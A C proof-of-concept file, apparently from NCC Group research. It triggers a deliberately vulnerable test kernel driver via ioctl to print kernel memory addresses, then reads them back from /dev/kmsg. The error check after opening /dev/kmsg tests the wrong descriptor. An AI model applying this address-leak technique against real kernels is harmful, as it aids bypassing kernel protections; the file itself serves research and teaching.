// SPDX-License-Identifier: GPL-2.0

// Buggy code, DO NOT USE. See https://research.nccgroup.com/?p=18577

// PoC intentionally leaking kernel memory addresses.

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>


#define VULN_PRINT_ADDR _IO('v', 1)


int main(int argc, char **argv)
{
	int fd = open("/dev/vuln_printk_leak", O_RDWR);
	if (fd < 0) {
		perror("open error");
		return -1;
	}

	int kmsg_fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
	if (fd < 0) {
		perror("open error");
		return -1;
	}

	lseek(kmsg_fd, 0, SEEK_END);

	if (ioctl(fd, VULN_PRINT_ADDR) < 0)
		perror("ioctl");

	char buf[128];
	ssize_t ret;
	while ((ret = read(kmsg_fd, buf, sizeof(buf))) > 0)
		write(1, buf, ret);

	return 0;
}
